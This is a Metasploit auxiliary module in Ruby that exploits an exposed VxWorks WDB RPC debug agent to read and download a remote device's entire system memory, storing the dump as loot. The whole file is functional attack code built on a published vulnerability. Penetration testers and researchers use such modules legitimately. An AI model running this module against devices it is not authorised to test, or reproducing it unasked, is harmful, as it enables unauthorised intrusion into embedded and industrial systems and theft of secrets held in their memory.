##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::WDBRPC_Client
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VxWorks WDB Agent Remote Memory Dump',
			'Description'    => %q{
				This module provides the ability to dump the system memory of a VxWorks target through WDBRPC
			},
			'Author'         => [ 'hdm'],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					['OSVDB', '66842'],
					['URL', 'http://blog.metasploit.com/2010/08/vxworks-vulnerabilities.html'],
					['URL', 'http://www.kb.cert.org/vuls/id/362332']
				],
			'Actions'     =>
				[
					['Download']
				],
			'DefaultAction' => 'Download'
			))

		register_options(
			[OptInt.new('OFFSET', [ true, "The starting offset to read the memory dump (hex allowed)", 0 ])], self.class)
	end

	def run_host(ip)
		offset = datastore['OFFSET'].to_i
		print_status("Attempting to dump system memory, starting at offset 0x%02x" % offset)

		wdbrpc_client_connect

		if not @wdbrpc_info[:rt_vers]
			print_error("No response to connection request")
			return
		end

		membase = @wdbrpc_info[:rt_membase]
		memsize = @wdbrpc_info[:rt_memsize]
		mtu     = @wdbrpc_info[:agent_mtu]

		print_status("Dumping #{"0x%.8x" % memsize} bytes from base address #{"0x%.8x" % membase} at offset #{"0x%.8x" % offset}...")


		mtu -= 80
		idx  = offset
		lpt  = 0.00
		sts = Time.now.to_f

		memory_dump = ""
		while (idx < memsize)
			buff = wdbrpc_client_memread(membase + idx, mtu)
			if not buff
				print_error("Failed to download data at offset #{"0x%.8x" % idx}")
				return
			end

			idx += buff.length
			memory_dump << buff

			pct = ((idx / memsize.to_f) * 10000).to_i
			pct = pct / 100.0

			if pct != lpt
				eta = Time.at(Time.now.to_f + (((Time.now.to_f - sts) / pct) * (100.0 - pct)))
				print_status("[ #{sprintf("%.2d", pct)} % ] Downloaded #{"0x%.8x" % idx} of #{"0x%.8x" % memsize} bytes (complete at #{eta.to_s})")
				lpt = pct
			end
		end

		filename= "#{datastore['RHOST']}_vxworks_memory.dmp"
		store_loot("host.vxworks.memory.dump", "application/octet-stream", datastore['RHOST'], memory_dump, filename, "VxWorks Memory Dump")
		
		print_status("Dumped #{"0x%.8x" % idx} bytes.")
		wdbrpc_client_disconnect
	end

end
